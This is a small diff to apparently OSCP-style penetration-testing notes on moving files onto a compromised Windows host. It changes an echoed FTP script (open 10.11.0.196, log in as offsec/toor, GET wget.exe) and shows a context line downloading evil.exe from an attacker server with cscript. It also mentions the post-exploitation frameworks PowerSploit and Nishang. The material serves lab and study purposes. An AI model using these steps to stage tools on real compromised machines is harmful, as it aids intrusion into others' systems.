@@ -9,9 +9,9 @@ Most windows machines have a ftp-client included. But we can't use it interactiv
 On the compromised machine we echo out the following commands into a file
 
 ```
-echo open 192.168.1.101 21> ftp.txt
-echo USER asshat>> ftp.txt
-echo mysecretpassword>> ftp.txt
+echo open 10.11.0.196> ftp.txt
+echo USER offsec>> ftp.txt
+echo toor>> ftp.txt
 echo bin>> ftp.txt
 echo GET wget.exe>> ftp.txt
 echo bye>> ftp.txt
@@ -23,7 +23,7 @@ Then run this command to connect to the ftp
 ftp -v -n -s:ftp.txt
 ```
 
-Of course you need to have a ftp-server configured with the user asshat and the password to mysecretpassword.
+Of course you need to have a ftp-server configured with the user offsec and the password to toor.
 
 ## TFTP
 
@@ -118,8 +118,6 @@ cscript wget.vbs http://192.168.10.5/evil.exe evil.exe
 ## PowerShell
 
 This is how we can download a file using PowerShell. Remember since we only have a non-interactive shell we cannot start PowerShell.exe, because our shell can't handle that. But we can get around that by creaing a PowerShell-script and then executing the script:
-
-
 
 Powersploit nisang \(Post exploitation frameworks\)
 
